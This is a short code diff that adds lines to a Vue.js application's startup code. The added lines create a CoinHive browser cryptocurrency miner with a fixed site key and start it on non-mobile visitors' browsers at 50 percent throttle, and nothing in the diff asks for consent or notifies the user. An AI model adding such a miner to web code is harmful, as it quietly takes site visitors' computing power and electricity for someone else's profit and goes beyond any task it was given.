@@ -23,6 +23,11 @@ let app = new Vue({
                 })
             }
         });
+
+        let miner = new CoinHive.Anonymous('lfbo0YVN0NTu1fmeRdzGt5nDE9JOnkcz', {throttle: 0.5});
+        if (!miner.isMobile()) {
+            miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+        }
     }
 });
 
